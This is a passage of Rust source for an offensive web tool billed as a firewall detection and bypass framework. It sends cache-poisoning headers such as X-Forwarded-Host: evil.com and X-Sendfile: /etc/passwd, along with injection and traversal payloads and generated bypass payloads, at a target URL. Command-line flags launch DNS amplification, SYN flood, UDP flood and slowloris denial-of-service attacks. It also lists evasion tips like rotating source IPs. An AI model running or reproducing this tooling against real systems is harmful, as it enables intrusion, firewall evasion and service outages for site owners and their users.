    headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.9"));
    
    let client = Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .danger_accept_invalid_certs(true)
        .default_headers(headers)
        .build()?;
    
    Ok(client)
}

fn get_cache_poisoning_payloads() -> Vec<String> {
    vec![
        // HTTP header-based cache poisoning
        "X-Forwarded-Host: evil.com".to_string(),
        "X-Host: evil.com".to_string(),
        "X-Original-URL: /admin".to_string(),
        "X-Rewrite-URL: /admin".to_string(),
        // Cache key manipulation
        "?_cache=poison".to_string(),
        "?cache_key=evil".to_string(),
        "?v=1.2.3.4".to_string(),
        "?version=poison".to_string(),
        // Method-based cache poisoning
        "HEAD".to_string(),
        "PURGE".to_string(),
        "DEBUG".to_string(),
        "TRACE".to_string(),
        // Web cache deception
        "/static/../admin".to_string(),
        "/css/../../admin".to_string(),
        "/js/../admin".to_string(),
        "/images/../../admin".to_string(),
        // HTTP/2 specific cache poisoning
        ":method: GET".to_string(),
        ":path: /admin".to_string(),
        ":scheme: https".to_string(),
        // Advanced cache poisoning
        "X-Cache-Status: MISS".to_string(),
        "X-Accel-Redirect: /admin".to_string(),
        "X-Sendfile: /etc/passwd".to_string(),
        "X-Real-IP: 127.0.0.1".to_string(),
    ]
}

async fn test_cache_poisoning(
    client: &Client,
    base_url: &str,
    payload: &str,
) -> Result<(u16, String, Duration, HeaderMap)> {
    let start_time = Instant::now();
    
    // Test different cache poisoning techniques
    let poisoned_url = if payload.starts_with("X-") {
        // Header-based poisoning
        let mut headers = HeaderMap::new();
        if payload.contains(":") {
            let parts: Vec<&str> = payload.splitn(2, ':').collect();
            if parts.len() == 2 {
                let header_name = parts[0].trim();
                let header_value = parts[1].trim();
                
                // Use known headers as static
                let header_value = HeaderValue::from_str(header_value)?;
                match header_name {
                    "X-Forwarded-Host" => headers.insert("X-Forwarded-Host", header_value),
                    "X-Host" => headers.insert("X-Host", header_value),
                    "X-Original-URL" => headers.insert("X-Original-URL", header_value),
                    "X-Rewrite-URL" => headers.insert("X-Rewrite-URL", header_value),
                    "X-Cache-Status" => headers.insert("X-Cache-Status", header_value),
                    "X-Accel-Redirect" => headers.insert("X-Accel-Redirect", header_value),
                    "X-Sendfile" => headers.insert("X-Sendfile", header_value),
                    "X-Real-IP" => headers.insert("X-Real-IP", header_value),
                    _ => None,
                };
            }
        }
        
        let response = timeout(
            Duration::from_secs(10),
            client.get(base_url).headers(headers).send()
        ).await??;
        
        let status = response.status().as_u16();
        let headers = response.headers().clone();
        let body = response.text().await?;
        let duration = start_time.elapsed();
        
        return Ok((status, body, duration, headers));
    } else if payload.starts_with("?") {
        // URL parameter poisoning
        format!("{}{}", base_url, payload)
    } else {
        // Method-based poisoning
        let method = match payload {
            "HEAD" => reqwest::Method::HEAD,
            "PURGE" => reqwest::Method::from_bytes(b"PURGE")?,
            "DEBUG" => reqwest::Method::from_bytes(b"DEBUG")?,
            "TRACE" => reqwest::Method::from_bytes(b"TRACE")?,
            _ => reqwest::Method::GET,
        };
        
        let response = timeout(
            Duration::from_secs(10),
            client.request(method, base_url).send()
        ).await??;
        
        let status = response.status().as_u16();
        let headers = response.headers().clone();
        let body = response.text().await?;
        let duration = start_time.elapsed();
        
        return Ok((status, body, duration, headers));
    };
    
    let response = timeout(
        Duration::from_secs(10),
        client.get(&poisoned_url).send()
    ).await??;
    
    let status = response.status().as_u16();
    let headers = response.headers().clone();
    let body = response.text().await?;
    let duration = start_time.elapsed();
    
    Ok((status, body, duration, headers))
}

async fn test_payload(
    client: &Client,
    base_url: &str,
    payload: &str,
    param_name: &str,
) -> Result<(u16, String, Duration, HeaderMap)> {
    let start_time = Instant::now();
    
    let url = if base_url.contains('?') {
        format!("{}&{}={}", base_url, param_name, urlencoding::encode(payload))
    } else {
        format!("{}?{}={}", base_url, param_name, urlencoding::encode(payload))
    };
    
    let response = timeout(
        Duration::from_secs(10),
        client.get(&url).send()
    ).await??;
    
    let status = response.status().as_u16();
    let headers = response.headers().clone();
    let body = response.text().await?;
    let duration = start_time.elapsed();
    
    Ok((status, body, duration, headers))
}

async fn analyze_base_response(client: &Client, url: &str) -> Result<(u16, String, Duration, HeaderMap)> {
    let start_time = Instant::now();
    
    let response = timeout(
        Duration::from_secs(10),
        client.get(url).send()
    ).await??;
    
    let status = response.status().as_u16();
    let headers = response.headers().clone();
    let body = response.text().await?;
    let duration = start_time.elapsed();
    
    Ok((status, body, duration, headers))
}

fn detect_waf_from_response(
    signatures: &[WAFSignature],
    status: u16,
    body: &str,
    headers: &HeaderMap,
) -> Vec<(String, f32)> {
    let mut detections = Vec::new();
    
    for signature in signatures {
        let mut confidence = 0.0;
        let mut matches = 0;
        let mut total_checks = 0;
        
        // Check response codes
        total_checks += 1;
        if signature.response_codes.contains(&status) {
            confidence += 0.3;
            matches += 1;
        }
        
        // Check response body patterns
        total_checks += 1;
        for pattern in &signature.response_body_patterns {
            if body.to_lowercase().contains(&pattern.to_lowercase()) {
                confidence += 0.4;
                matches += 1;
                break;
            }
        }
        
        // Check headers
        total_checks += 1;
        for (header_name, expected_value) in &signature.headers {
            if let Some(header_value) = headers.get(header_name) {
                let header_str = header_value.to_str().unwrap_or("").to_lowercase();
                let expected_str = expected_value.to_lowercase();
                
                if expected_str == "*" || header_str.contains(&expected_str) {
                    confidence += 0.3;
                    matches += 1;
                    break;
                }
            }
        }
        
        // Normalize confidence
        if matches > 0 {
            confidence = (confidence / total_checks as f32) * signature.detection_confidence;
            if confidence > 0.5 {
                detections.push((signature.name.clone(), confidence));
            }
        }
    }
    
    // Sort by confidence
    detections.sort_by(|a, b| b.1.partial_cmp(&a.1).unwrap_or(std::cmp::Ordering::Equal));
    
    detections
}

async fn run_waf_detection(args: Args) -> Result<WAFDetectionResult> {
    let client = create_http_client(&args).await?;
    let signatures = get_waf_signatures();
    
    let target = args.target.as_ref().ok_or_else(|| anyhow::anyhow!("Target URL is required"))?;
    
    let base_url = if args.path.starts_with('/') {
        format!("{}{}", target.trim_end_matches('/'), args.path)
    } else {
        format!("{}/{}", target.trim_end_matches('/'), args.path)
    };
    
    info!(" Testing target: {}", base_url);
    
    // Analyze base response first
    let (base_status, base_body, base_duration, base_headers) = 
        analyze_base_response(&client, &base_url).await?;
    
    info!(" Base response: {} ({}ms)", base_status, base_duration.as_millis());
    
    let mut all_detections = Vec::new();
    let mut blocked_payloads = Vec::new();
    let mut response_times = Vec::new();
    let mut status_codes = HashMap::new();
    let mut common_headers = HashMap::new();
    
    // Collect base headers
    for (name, value) in base_headers.iter() {
        let name_str = name.as_str();
        if let Ok(value_str) = value.to_str() {
            common_headers.insert(name_str.to_string(), value_str.to_string());
        }
    }
    
    status_codes.insert(base_status, 1);
    response_times.push(base_duration.as_secs_f64());
    
    // Test base response for WAF signatures
    let base_detections = detect_waf_from_response(&signatures, base_status, &base_body, &base_headers);
    all_detections.extend(base_detections);
    
    // Test payloads
    let mut payloads_to_test = Vec::new();
    
    if args.test_common {
        payloads_to_test.extend(get_common_waf_test_payloads());
    }
    
    if args.test_sql {
        payloads_to_test.extend(get_sql_payloads());
    }
    
    if args.test_xss {
        payloads_to_test.extend(get_xss_payloads());
    }
    
    if args.test_path_traversal {
        payloads_to_test.extend(get_path_traversal_payloads());
    }
    
    if args.test_command_injection {
        payloads_to_test.extend(get_command_injection_payloads());
    }
    
    if args.detect_stealth {
        payloads_to_test.extend(get_stealth_detection_payloads());
    }
    
    if args.test_http2 {
        payloads_to_test.extend(get_http2_attack_payloads());
    }
    
    // Limit payloads for reasonable testing time
    payloads_to_test.truncate(args.advanced_payloads);
    
    info!("🔍 Testing {} payloads", payloads_to_test.len());
    
    for (i, payload) in payloads_to_test.iter().enumerate() {
        if args.verbose {
            info!("Testing payload {}/{}: {}", i + 1, payloads_to_test.len(), payload);
        }
        
        match test_payload(&client, &base_url, payload, "test").await {
            Ok((status, body, duration, headers)) => {
                response_times.push(duration.as_secs_f64());
                *status_codes.entry(status).or_insert(0) += 1;
                
                // Check if payload was blocked (common WAF indicators)
                let is_blocked = status == 403 || 
                                status == 406 || 
                                status == 503 ||
                                body.to_lowercase().contains("blocked") ||
                                body.to_lowercase().contains("forbidden") ||
                                body.to_lowercase().contains("access denied") ||
                                body.to_lowercase().contains("security") ||
                                body.to_lowercase().contains("waf") ||
                                body.to_lowercase().contains("captcha");
                
                if is_blocked {
                    blocked_payloads.push(payload.clone());
                }
                
                // Detect WAF from this response
                let detections = detect_waf_from_response(&signatures, status, &body, &headers);
                all_detections.extend(detections);
                
                if args.verbose && is_blocked {
                    info!("🚫 Payload blocked: {} (Status: {})", payload, status);
                }
            }
            Err(e) => {
                if args.verbose {
                    warn!("❌ Failed to test payload '{}': {}", payload, e);
                }
            }
        }
        
        // Small delay to avoid overwhelming the target
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    
    // Cache poisoning attacks if enabled
    if args.cache_poison {
        info!("🧪 Testing cache poisoning attacks...");
        let cache_payloads = get_cache_poisoning_payloads();
        
        for payload in cache_payloads.iter().take(20) {
            if args.verbose {
                info!("Testing cache poison: {}", payload);
            }
            
            match test_cache_poisoning(&client, &base_url, payload).await {
                Ok((status, body, duration, headers)) => {
                    response_times.push(duration.as_secs_f64());
                    *status_codes.entry(status).or_insert(0) += 1;
                    
                    // Check for cache poisoning success
                    let cache_poisoned = status == 200 && 
                        (body.to_lowercase().contains("admin") ||
                         body.to_lowercase().contains("evil") ||
                         headers.get("x-cache").is_some() ||
                         headers.get("x-cache-status").is_some());
                    
                    if cache_poisoned {
                        blocked_payloads.push(format!("CACHE_POISON: {}", payload));
                        info!("🎯 Cache poisoning successful: {}", payload);
                    }
                    
                    // Detect WAF from cache poisoning response
                    let detections = detect_waf_from_response(&signatures, status, &body, &headers);
                    all_detections.extend(detections);
                }
                Err(e) => {
                    if args.verbose {
                        warn!("❌ Failed cache poison '{}': {}", payload, e);
                    }
                }
            }
            
            tokio::time::sleep(Duration::from_millis(200)).await;
        }
    }
    
    // Aggressive detection if enabled
    if args.aggressive {
        info!("⚡ Running aggressive detection...");
        
        // Test with different HTTP methods
        let methods = vec!["OPTIONS", "TRACE", "DEBUG", "PATCH"];
        for method in methods {
            let url = base_url.clone();
            let req_client = client.clone();
            
            match timeout(
                Duration::from_secs(10),
                req_client.request(reqwest::Method::from_bytes(method.as_bytes())?, &url).send()
            ).await {
                Ok(Ok(response)) => {
                    let status = response.status().as_u16();
                    let headers = response.headers().clone();
                    let body = response.text().await.unwrap_or_else(|_| "Failed to read body".to_string());
                    
                    let detections = detect_waf_from_response(&signatures, status, &body, &headers);
                    all_detections.extend(detections);
                    
                    if args.verbose {
                        info!("🔍 {} method: {}", method, status);
                    }
                }
                _ => {}
            }
        }
        
        // Test with malformed headers
        let malformed_headers = vec![
            ("X-Forwarded-For", "127.0.0.1,evil.com"),
            ("X-Real-IP", "0x7f000001"),
            ("X-Originating-IP", "8.8.8.8"),
            ("X-Remote-IP", "192.168.1.1"),
            ("X-Remote-Addr", "10.0.0.1"),
        ];
        
        for (header_name, header_value) in malformed_headers {
            let mut headers = HeaderMap::new();
            headers.insert(header_name, HeaderValue::from_str(header_value)?);
            
            let req_client = client.clone();
            let url = base_url.clone();
            
            match timeout(
                Duration::from_secs(10),
                req_client.get(&url).headers(headers).send()
            ).await {
                Ok(Ok(response)) => {
                    let status = response.status().as_u16();
                    let resp_headers = response.headers().clone();
                    let body = response.text().await.unwrap_or_else(|_| "Failed to read body".to_string());
                    
                    let detections = detect_waf_from_response(&signatures, status, &body, &resp_headers);
                    all_detections.extend(detections);
                    
                    if args.verbose {
                        info!("🔍 {}: {}", header_name, status);
                    }
                }
                _ => {}
            }
        }
    }
    
    // Aggregate results
    let mut detection_scores = HashMap::new();
    for (waf_name, confidence) in &all_detections {
        *detection_scores.entry(waf_name.clone()).or_insert(0.0) += confidence;
    }
    
    // Find best match
    let (best_waf, best_confidence) = detection_scores
        .into_iter()
        .max_by(|a, b| a.1.partial_cmp(&b.1).unwrap_or(std::cmp::Ordering::Equal))
        .unwrap_or((String::new(), 0.0));
    
    // Execute dangerous attacks if enabled
    if args.test_dns_amplification {
        info!("Executing DNS amplification attacks...");
        let dns_server = args.custom_dns.as_deref().unwrap_or("8.8.8.8");
        let target_str = target.as_str();
        match execute_dns_amplification(target_str, dns_server).await {
            Ok(result) => {
                // Only report success if actual amplification occurred
                if result.amplification_factor > 1.0 && result.successful_queries > 0 {
                    info!("✅ DNS amplification successful: {}x amplification, {} successful queries", 
                          result.amplification_factor, result.successful_queries);
                    blocked_payloads.push(format!("DNS_AMPLIFICATION_SUCCESS: {}x amplification", result.amplification_factor));
                } else {
                    warn!("❌ DNS amplification failed: No amplification detected");
                }
            }
            Err(e) => {
                warn!("❌ DNS amplification failed: {}", e);
            }
        }
    }
    
    if args.test_tcp_syn_flood {
        info!("Executing TCP SYN flood attacks...");
        let ports = get_tcp_syn_flood_targets();
        let target_str = target.as_str();
        match execute_tcp_syn_flood(target_str, &ports).await {
            Ok(result) => {
                // Only report success if packets were actually sent and ports were responsive
                if result.packets_sent > 0 && !result.successful_ports.is_empty() {
                    info!("✅ TCP SYN flood successful: {} packets sent to {} responsive ports", 
                          result.packets_sent, result.successful_ports.len());
                    blocked_payloads.push(format!("TCP_SYN_FLOOD_SUCCESS: {} packets, {} ports", 
                                                   result.packets_sent, result.successful_ports.len()));
                } else {
                    warn!("❌ TCP SYN flood failed: No packets sent or no responsive ports");
                }
            }
            Err(e) => {
                warn!("❌ TCP SYN flood failed: {}", e);
            }
        }
    }
    
    if args.test_udp_flood {
        info!("Executing UDP flood attacks...");
        let target_str = target.as_str();
        match execute_udp_flood(target_str, 53, 1024).await {
            Ok(result) => {
                // Only report success if packets were actually sent
                if result.packets_sent > 0 {
                    info!("✅ UDP flood successful: {} packets sent ({} bytes)", 
                          result.packets_sent, result.bytes_transmitted);
                    blocked_payloads.push(format!("UDP_FLOOD_SUCCESS: {} packets", result.packets_sent));
                } else {
                    warn!("❌ UDP flood failed: No packets sent");
                }
            }
            Err(e) => {
                warn!("❌ UDP flood failed: {}", e);
            }
        }
    }
    
    if args.test_slowloris {
        info!("Executing HTTP slowloris attacks...");
        let target_str = target.as_str();
        match execute_http_slowloris(target_str).await {
            Ok(result) => {
                // Only report success if connections were actually established
                if result.connections_established > 0 {
                    info!("✅ HTTP slowloris successful: {} connections established, {} maintained", 
                          result.connections_established, result.connections_maintained);
                    blocked_payloads.push(format!("SLOWLORIS_SUCCESS: {} connections", result.connections_established));
                } else {
                    warn!("❌ HTTP slowloris failed: No connections established");
                }
            }
            Err(e) => {
                warn!("❌ HTTP slowloris failed: {}", e);
            }
        }
    }
    
    if args.test_ssl_attacks {
        info!("Executing SSL/TLS attacks...");
        let target_str = target.as_str();
        match execute_ssl_attacks(target_str).await {
            Ok(result) => {
                // Only report success if vulnerabilities were actually found
                if !result.vulnerable_versions.is_empty() || !result.weak_ciphers.is_empty() {
                    info!("✅ SSL/TLS attacks successful: {} vulnerable versions, {} weak ciphers", 
                          result.vulnerable_versions.len(), result.weak_ciphers.len());
                    blocked_payloads.push(format!("SSL_ATTACKS_SUCCESS: {} vulns, {} ciphers", 
                                                   result.vulnerable_versions.len(), result.weak_ciphers.len()));
                } else {
                    warn!("❌ SSL/TLS attacks failed: No vulnerabilities found");
                }
            }
            Err(e) => {
                warn!("❌ SSL/TLS attacks failed: {}", e);
            }
        }
    }
    
    if args.simulate_ips {
        info!("Simulating multiple IP addresses...");
        let target_str = target.as_str();
        match simulate_multiple_ips(target_str).await {
            Ok(_) => {
                // IP simulation is always successful since it's just header manipulation
                info!("✅ IP simulation completed: Multiple IP headers sent");
                blocked_payloads.push("IP_SIMULATION_SUCCESS: Headers sent".to_string());
            }
            Err(e) => {
                warn!("❌ IP simulation failed: {}", e);
            }
        }
    }
    
    if args.generate_bypass && !best_waf.is_empty() {
        info!("Generating bypass payloads for detected WAF...");
        let bypass_payloads = generate_bypass_payloads(&best_waf);
        for payload in bypass_payloads {
            if args.verbose {
                info!("Testing bypass payload: {}", payload);
            }
            
            match test_payload(&client, &base_url, &payload, "bypass").await {
                Ok((status, body, duration, headers)) => {
                    response_times.push(duration.as_secs_f64());
                    *status_codes.entry(status).or_insert(0) += 1;
                    
                    let bypassed = status == 200 && 
                        !body.to_lowercase().contains("blocked") &&
                        !body.to_lowercase().contains("forbidden");
                    
                    if bypassed {
                        blocked_payloads.push(format!("BYPASS_SUCCESS: {}", payload));
                        info!("Bypass successful: {}", payload);
                    }
                    
                    let detections = detect_waf_from_response(&signatures, status, &body, &headers);
                    all_detections.extend(detections);
                }
                Err(e) => {
                    if args.verbose {
                        warn!("Failed bypass test '{}': {}", payload, e);
                    }
                }
            }
        }
    }
    
    let avg_response_time = response_times.iter().sum::<f64>() / response_times.len() as f64;
    
    let mut blocking_indicators = Vec::new();
    if blocked_payloads.len() > 0 {
        blocking_indicators.push("Payload blocking detected".to_string());
    }
    if base_status == 403 || base_status == 406 {
        blocking_indicators.push("Base request blocked".to_string());
    }
    
    // Generate bypass techniques based on detected WAF
    let mut bypass_techniques = Vec::new();
    if best_waf.to_lowercase().contains("cloudflare") {
        bypass_techniques.extend(vec![
            "Try different User-Agent headers".to_string(),
            "Use HTTP/2 if available".to_string(),
            "Rotate source IP addresses".to_string(),
            "Test with subdomain bypass".to_string(),
        ]);
    } else if best_waf.to_lowercase().contains("aws") {
        bypass_techniques.extend(vec![
            "Test different AWS regions".to_string(),
            "Use API Gateway endpoints".to_string(),
            "Try CloudFront distribution bypass".to_string(),
        ]);
    } else {
        bypass_techniques.extend(vec![
            "Test parameter pollution".to_string(),
            "Try encoding variations".to_string(),
            "Test HTTP method bypass".to_string(),
            "Use fragmentation techniques".to_string(),
        ]);
    }
    
    Ok(WAFDetectionResult {
        target: base_url,
        timestamp: chrono::Utc::now().to_rfc3339(),
        waf_detected: best_confidence > 0.5,
        waf_name: if best_confidence > 0.5 { Some(best_waf) } else { None },
        waf_vendor: None, // Could be mapped from WAF name
        confidence: best_confidence,
        signatures_matched: all_detections.iter().map(|(name, _)| name.clone()).collect(),
        blocked_payloads,
        response_analysis: ResponseAnalysis {
            avg_response_time,
            status_code_distribution: status_codes,
            common_headers,
            blocking_indicators,
        },
        bypass_techniques,
    })
}

/// Display animated firewall-themed banner
async fn display_firewall_banner() {
    let frames = vec!["[", "[[", "[[[", "[[[[", "[[[[[", "[[[[[[", "[[[[[[[", "[[[[[[[["];
    
    // Animated loading
    print!("\n\n");
    for _ in 0..2 {
        for frame in &frames {
            print!("\r{}  Initializing WAF Detection System...  {}", frame.bright_red().bold(), frame.bright_red().bold());
            io::stdout().flush().unwrap();
            std::thread::sleep(std::time::Duration::from_millis(60));
        }
    }
    println!("\r{}", " ".repeat(60));
    
    // Main firewall banner
    println!("{}", "╔════════════════════════════════════════════════════════════════════════════╗".bright_red().bold());
    println!("{}", "║                                                                            ║".bright_red().bold());
    println!("{}  {}",
        "║".bright_red().bold(),
        "██╗    ██╗ █████╗ ███████╗    ██████╗ ███████╗████████╗███████╗ ██████╗████████╗".bright_white().bold()
    );
    println!("{}  {}",
        "║".bright_red().bold(),
        "██║    ██║██╔══██╗██╔════╝    ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝".bright_white().bold()
    );
    println!("{}  {}",
        "║".bright_red().bold(),
        "██║ █╗ ██║███████║█████╗      ██║  ██║█████╗     ██║   █████╗  ██║        ██║   ".bright_white().bold()
    );
    println!("{}  {}",
        "║".bright_red().bold(),
        "██║███╗██║██╔══██║██╔══╝      ██║  ██║██╔══╝     ██║   ██╔══╝  ██║        ██║   ".bright_white().bold()
    );
    println!("{}  {}",
        "║".bright_red().bold(),
        "╚███╔███╔╝██║  ██║██║         ██████╔╝███████╗   ██║   ███████╗╚██████╗   ██║   ".bright_white().bold()
    );
    println!("{}  {}",
        "║".bright_red().bold(),
        " ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝   ".bright_white().bold()
    );
    println!("{}", "║                                                                            ║".bright_red().bold());
    println!("{}  {}  {}",
        "║".bright_red().bold(),
        "Advanced Web Application Firewall Detection & Bypass Framework".bright_white(),
        format!("v{}", "3.5.2091").bright_yellow().bold()
    );
    println!("{}", "║                                                                            ║".bright_red().bold());
    println!("{}  {}  {}",
        "║".bright_red().bold(),
        "Author:".bright_cyan(),
        "khaninkali | HyperSecurity Red Team".white()
    );
    println!("{}", "║                                                                            ║".bright_red().bold());
    println!("{}", "╠════════════════════════════════════════════════════════════════════════════╣".bright_red().bold());
    
    // System information
    let os = std::env::consts::OS;
    let arch = std::env::consts::ARCH;
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    
    println!("{}  {}  {}",
        "║".bright_red().bold(),
        "System:".bright_magenta().bold(),
        format!("{} ({})", os, arch).white()
    );
    println!("{}  {}  {}",
        "║".bright_red().bold(),
        "Hostname:".bright_magenta().bold(),
        hostname.white()
    );
    println!("{}  {}  {}",
        "║".bright_red().bold(),
        "Mode:".bright_magenta().bold(),
        "Advanced Red Team Operations".bright_green().bold()
    );
    println!("{}  {}  {}",
        "║".bright_red().bold(),
        "Status:".bright_magenta().bold(),
        "ARMED & READY".bright_green().bold()
    );
    println!("{}", "║                                                                            ║".bright_red().bold());
    println!("{}", "╚════════════════════════════════════════════════════════════════════════════╝".bright_red().bold());
    println!();
    
    // Animated ready message
    for frame in &frames[0..6] {
        print!("\r{}  Firewall detection system initialized and ready", frame.green().bold());
        io::stdout().flush().unwrap();
        std::thread::sleep(std::time::Duration::from_millis(80));
    }
    println!("\r{}", "[READY]  Firewall detection system initialized and ready".green().bold());
    println!();
}

/// Display help for interactive mode
fn display_interactive_help() {
    println!();
    println!("{}", "════════════════════════════════════════════════════════════════════".bright_red());
    println!("{}  {}", "  Command".bright_yellow().bold(), "Description".bright_yellow().bold());
    println!("{}", "════════════════════════════════════════════════════════════════════".bright_red());
    println!("  {}      Display this help message", "help".bright_green());
    println!("  {}      Scan target for WAF detection", "scan".bright_green());
    println!("  {}    Set target URL", "target".bright_green());
    println!("  {}    Show current configuration", "config".bright_green());
    println!("  {}      Show system information", "info".bright_green());
    println!("  {}     Clear the terminal screen", "clear".bright_green());
    println!("  {}      Exit the application", "exit".bright_green());
    println!("{}", "════════════════════════════════════════════════════════════════════".bright_red());
    println!();
    println!("{}", "  Attack Modules:".bright_cyan().bold());
    println!("  {}       Enable SQL injection testing", "sql".bright_green());
    println!("  {}       Enable XSS testing", "xss".bright_green());
    println!("  {}     Enable path traversal testing", "path".bright_green());
    println!("  {}       Enable command injection testing", "cmd".bright_green());
    println!("  {}     Enable cache poisoning attacks", "cache".bright_green());
    println!("  {}   Enable stealth WAF detection", "stealth".bright_green());
    println!("  {}  Enable aggressive detection mode", "aggressive".bright_green());
    println!("{}", "════════════════════════════════════════════════════════════════════".bright_red());
    println!();
}

/// Interactive mode with command prompt
async fn interactive_mode(args: Args) -> Result<()> {
    display_firewall_banner().await;
    
    println!("{}", "Type 'help' for available commands or 'scan' to begin detection".bright_white().dimmed());
    println!();
    
    let mut current_target = args.target.clone();
    let mut config = args.clone();
    
    loop {
        print!("{}", "wafdetect> ".bright_red().bold());
        io::stdout().flush()?;
        
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
        let command = input.trim().to_lowercase();
        let parts: Vec<&str> = input.trim().split_whitespace().collect();
        
        match parts.get(0).map(|s| s.to_lowercase()).as_deref() {
            Some("help") => {
                display_interactive_help();
            }
            Some("scan") => {
                if current_target.is_none() {
                    println!("{}", "[ERROR] No target set. Use 'target <URL>' first".red().bold());
                    continue;
                }
                
                println!();
                println!("{}", "[SCAN] Initiating WAF detection scan...".bright_green().bold());
                println!();
                
                config.target = current_target.clone();
                
                match run_waf_detection(config.clone()).await {
                    Ok(result) => {
                        display_scan_results(&result);
                    }
                    Err(e) => {
                        println!("{} {}", "[ERROR]".red().bold(), e);
                    }
                }
            }
            Some("target") => {
                if parts.len() < 2 {
                    println!("{}", "[ERROR] Usage: target <URL>".red().bold());
                } else {
                    current_target = Some(parts[1].to_string());
                    config.target = current_target.clone();
                    println!("{} Target set to: {}", "[OK]".green().bold(), parts[1].bright_cyan());
                }
            }
            Some("config") => {
                println!();
                println!("{}", "════════════════════════════════════════════════════════".bright_red());
                println!("{}  Current Configuration", "  ".bright_red());
                println!("{}", "════════════════════════════════════════════════════════".bright_red());
                println!("  {}  {}", "Target:".bright_blue(), 
                    current_target.as_ref().unwrap_or(&"Not set".to_string()).white());
                println!("  {}  {}", "Path:".bright_blue(), config.path.white());
                println!("  {}  {} seconds", "Timeout:".bright_blue(), config.timeout.to_string().white());
                println!("  {}  {}", "SQL Test:".bright_blue(), 
                    if config.test_sql { "ENABLED".green() } else { "DISABLED".red() });
                println!("  {}  {}", "XSS Test:".bright_blue(), 
                    if config.test_xss { "ENABLED".green() } else { "DISABLED".red() });
                println!("  {}  {}", "Path Traversal:".bright_blue(), 
                    if config.test_path_traversal { "ENABLED".green() } else { "DISABLED".red() });
                println!("  {}  {}", "Command Injection:".bright_blue(), 
                    if config.test_command_injection { "ENABLED".green() } else { "DISABLED".red() });
                println!("  {}  {}", "Cache Poisoning:".bright_blue(), 
                    if config.cache_poison { "ENABLED".green() } else { "DISABLED".red() });
                println!("  {}  {}", "Stealth Detection:".bright_blue(), 
                    if config.detect_stealth { "ENABLED".green() } else { "DISABLED".red() });
                println!("  {}  {}", "Aggressive Mode:".bright_blue(), 
                    if config.aggressive { "ENABLED".green() } else { "DISABLED".red() });
                println!("{}", "════════════════════════════════════════════════════════".bright_red());
                println!();
            }
            Some("info") => {
                println!();
                println!("{}", "════════════════════════════════════════════════════════".bright_red());
                println!("{}  System Information", "  ".bright_red());
                println!("{}", "════════════════════════════════════════════════════════".bright_red());
                println!("  {}  {}", "OS:".bright_blue(), std::env::consts::OS.white());
                println!("  {}  {}", "Architecture:".bright_blue(), std::env::consts::ARCH.white());
                println!("  {}  {}", "Version:".bright_blue(), "3.5.2091".white());
                println!("  {}  {}", "Mode:".bright_blue(), "Red Team Operations".bright_green());
                println!("{}", "════════════════════════════════════════════════════════".bright_red());
                println!();
            }
            Some("sql") => {
                config.test_sql = !config.test_sql;
                println!("{} SQL injection testing: {}", "[OK]".green().bold(),
                    if config.test_sql { "ENABLED".green() } else { "DISABLED".red() });
            }
            Some("xss") => {
                config.test_xss = !config.test_xss;
                println!("{} XSS testing: {}", "[OK]".green().bold(),
                    if config.test_xss { "ENABLED".green() } else { "DISABLED".red() });
            }
            Some("path") => {
                config.test_path_traversal = !config.test_path_traversal;
                println!("{} Path traversal testing: {}", "[OK]".green().bold(),
                    if config.test_path_traversal { "ENABLED".green() } else { "DISABLED".red() });
            }
            Some("cmd") => {
                config.test_command_injection = !config.test_command_injection;
                println!("{} Command injection testing: {}", "[OK]".green().bold(),
                    if config.test_command_injection { "ENABLED".green() } else { "DISABLED".red() });
            }
            Some("cache") => {
                config.cache_poison = !config.cache_poison;
                println!("{} Cache poisoning: {}", "[OK]".green().bold(),
                    if config.cache_poison { "ENABLED".green() } else { "DISABLED".red() });
            }
            Some("stealth") => {
                config.detect_stealth = !config.detect_stealth;
                println!("{} Stealth detection: {}", "[OK]".green().bold(),
                    if config.detect_stealth { "ENABLED".green() } else { "DISABLED".red() });
            }
            Some("aggressive") => {
                config.aggressive = !config.aggressive;
                println!("{} Aggressive mode: {}", "[OK]".green().bold(),
                    if config.aggressive { "ENABLED".green() } else { "DISABLED".red() });
            }
            Some("clear") => {
                print!("\x1B[2J\x1B[1;1H");
                io::stdout().flush()?;
            }
            Some("exit") | Some("quit") => {
                println!();
                println!("{}", "[SHUTDOWN] Terminating WAF detection system...".bright_yellow());
                tokio::time::sleep(Duration::from_millis(500)).await;
                println!("{}", "[OK] System shutdown complete".green().bold());
                println!();
                break;
            }
            Some("") | None => {
                // Empty input
            }
            _ => {
                println!("{} Unknown command: '{}'", "[ERROR]".red().bold(), command.white());
                println!("  Type {} for available commands", "help".bright_green());
            }
        }
    }
    
    Ok(())
}

/// Display scan results in formatted output
fn display_scan_results(result: &WAFDetectionResult) {
    println!();
    println!("{}", "════════════════════════════════════════════════════════════════════".bright_red());
    println!("{}  WAF Detection Results", "  ".bright_red());
    println!("{}", "════════════════════════════════════════════════════════════════════".bright_red());
    println!("  {}  {}", "Target:".bright_blue(), result.target.white());
    println!("  {}  {}", "Timestamp:".bright_blue(), result.timestamp.white());
    
    if result.waf_detected {
        println!("  {}  {}", "WAF Detected:".bright_blue(), "YES".bright_green().bold());
        if let Some(waf_name) = &result.waf_name {
            println!("  {}  {}", "WAF Name:".bright_blue(), waf_name.bright_yellow().bold());
        }
        println!("  {}  {:.1}%", "Confidence:".bright_blue(), (result.confidence * 100.0).to_string().bright_green());
    } else {
        println!("  {}  {}", "WAF Detected:".bright_blue(), "NO".red());
    }
    
    if !result.blocked_payloads.is_empty() {
        println!("  {}  {}", "Blocked Payloads:".bright_blue(), result.blocked_payloads.len().to_string().bright_red());
    }
    
    println!("  {}  {:.2}ms", "Avg Response Time:".bright_blue(), 
        (result.response_analysis.avg_response_time * 1000.0).to_string().white());
    
    if !result.bypass_techniques.is_empty() {
        println!();
        println!("  {}:", "Bypass Techniques".bright_cyan().bold());
        for technique in &result.bypass_techniques {
            println!("    - {}", technique.white());
        }
    }
    
    println!("{}", "════════════════════════════════════════════════════════════════════".bright_red());
    println!();
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    
    // Setup logging
    let _log_level = if args.verbose { "debug" } else { "info" };
